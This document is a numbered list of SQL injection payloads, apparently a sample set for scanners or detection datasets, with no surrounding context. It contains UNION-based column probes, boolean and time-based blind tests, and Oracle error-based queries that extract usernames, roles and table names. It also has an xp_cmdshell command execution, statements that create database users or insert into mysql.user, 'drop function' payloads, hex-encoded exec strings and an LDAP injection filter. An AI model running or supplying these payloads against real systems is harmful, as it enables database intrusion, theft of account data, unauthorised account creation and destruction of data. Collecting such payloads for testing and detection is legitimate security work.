1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
24 -2378" where 2686  =  2686 or 6872  =  6872-- 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
86 -9891" union all select 7489# 
97 -9356 or elt  (  1032  =  1032,3623  )  -- izgi 
106 -1447" union all select 3013,3013,3013,3013,3013,3013,3013-- 
113 -2071 union all select 4753,4753-- 
133  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i 
182 -- &password  =  
192 -4955%' union all select 5928,5928-- 
203  (  8266  =  8266  )  *9900 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
223 -4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285# 
275 declare @s varchar  (  22  )   select @s   =  
284 -1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  -- 
319 -7416" where 7656  =  7656 order by 1-- 
322 if  (  3392  =  4422  )   select 3392 else drop function xsqq-- 
328 -3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741# 
332 -9393' where 3119  =  3119 or 8571  =  8571-- 
338 -8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049# 
382  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i 
388 -4494 or 5291  =  4452 
426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
432 %2A%28%7C%28objectclass%3D%2A%29%29 
466 -2569' union all select 4484-- 
503 -8633" or 5099  =  5974 
504 -5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- 
505 -8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492# 
508  AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i 
513 -2211" or 2113  =  8885# 
517 -5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- 
543 -1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415# 
555 create user name identified by 'pass123' 
568 -6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271# 
575 if  (  4735  =  8907  )   select 4735 else drop function qigo-- 
586 -5425 where 5933  =  5933 union all select 5933,5933,5933-- 
601 -4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415# 
605  (  7098  =  7098 and sleep  (  5   )    )  
608 -7006' where 6966  =  6966 union all select 6966,6966,6966,6966# 
621 -4045 union all select 6857,6857,6857,6857,6857,6857,6857-- 
635 -8881%' union all select 8420,8420,8420,8420,8420,8420,8420# 
646 if  (  8284  =  6171  )   select 8284 else drop function mbih-- 
668 -2658  )   as casi where 7364  =  7364 or 8245  =  9651-- 
687 -5798" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   
690 -3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  -- 
701 -9841 where 4612  =  4612 union all select 4612-- 
710 ns 
758 \x27UNION SELECT 
797 declare @s varchar  (  200  )   select @s   =   0x77616974 ... 
831 -6731" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166-- 
868 -9958"  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741# 
890 -7395%" order by 1-- 
892 -1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896-- 
895 -8521'+  (  select ucim where 9003  =  9003 union all select 9003-- 
908 -5751  )   as jybu where 4739  =  4739 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- 
959 -8868"  )   where 5681  =  5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- 
974 -7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089-- 
984 make_set  (  5679  =  9769,9769  )   
1011 -3321" where 1603  =  1603 union all select 1603,1603,1603,1603# 
1012 if  (  8995  =  9787  )   select 8995 else drop function ofgg-- 
1051 -9535" order by 1-- 
1069 -5147 or   (  8459  =  8459  )  *4906 
1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
1094 ^' 
1101 -7466 where 5161  =  5161 or 3038  =  3038 
1117 -5963" or 9323  =  9323# 
1135 -8933  )   as iiyr where 1974  =  1974 union all select 1974,1974,1974,1974,1974# 
1143 iif  (  1217  =  8831,1,1/0  )   
